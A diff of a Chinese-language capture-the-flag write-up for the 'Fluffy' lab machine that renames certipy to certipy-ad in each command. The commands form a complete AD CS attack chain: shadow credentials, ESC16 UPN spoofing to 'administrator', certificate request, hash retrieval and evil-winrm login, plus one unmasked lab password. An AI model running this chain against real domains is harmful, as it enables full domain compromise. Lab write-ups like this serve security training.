@@ -45,7 +45,7 @@
 
 ![](./Fluffy/11.jpg)
 #### p.agila账号可以读写ACCOUNTS组，使用p.agila账号在WINRM_SVC下创建影子凭证
-#### `certipy shadow auto -u 'p.agila@fluffy.htb' -p 'xxxxxxxx' -account 'WINRM_SVC'  -dc-ip '10.10.11.69'`
+#### `certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'xxxxxxxx' -account 'WINRM_SVC'  -dc-ip '10.10.11.69'`
 ![](./Fluffy/12-2.jpg)
 #### （注：如果本机与目标机时间不一样会失败，需要先关闭时间自动同步然后把时间改成和目标机一致）
 #### `systemctl stop systemd-timesyncd`
@@ -58,7 +58,7 @@
 #### 在桌面发现flag
 ## 提权 ##
 #### certipy检测有没有可利用的漏洞
-#### `certipy find -username winrm_svc -hashes "xxxxxxxxxxxxxxxxxxxxxxxxxx" -dc-ip 10.10.11.69 -vulnerable`
+#### `certipy-ad find -username winrm_svc -hashes "xxxxxxxxxxxxxxxxxxxxxxxxxx" -dc-ip 10.10.11.69 -vulnerable`
 #### 使用winrm_svc和hash没有检测到东西
 
 #### 在ca_svc下创建影子凭证，再次检测
@@ -70,11 +70,11 @@
 #### 直接按照工具给的提权方式操作
 #### [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
 #### 读取ca_svc账号的UPN
-#### `certipy account -u 'p.agila@fluffy.htb' -p 'xxxxxxx' -dc-ip '10.10.11.69' -user 'ca_svc' read`
+#### `certipy-ad account -u 'p.agila@fluffy.htb' -p 'xxxxxxx' -dc-ip '10.10.11.69' -user 'ca_svc' read`
 ![](./Fluffy/16-3.jpg)
 
 #### 更新UPN为administrator
-#### `certipy account -u 'p.agila@fluffy.htb' -p 'xxxxxxx' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update`
+#### `certipy-ad account -u 'p.agila@fluffy.htb' -p 'xxxxxxx' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update`
 ![](./Fluffy/16.jpg)
 
 #### 再次查看
@@ -82,17 +82,17 @@
 
 #### 设置环境变量`export KRB5CCNAME=ca_svc.ccache`
 #### ca_svc.ccache是创建影子凭证的时候生成的
-#### 请求证书`certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'`
+#### 请求证书`certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'`
 ![](./Fluffy/17.jpg)
 
 ![](./Fluffy/17-1.jpg)
 
 #### 获取administrator的hash
-`certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'`
+`certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'`
 ![](./Fluffy/18.jpg)
 
 #### 将ca_svc的UPN还原回去
-#### `certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update`
+#### `certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update`
 
 #### evil-winrm登录
 ![](./Fluffy/19.jpg)
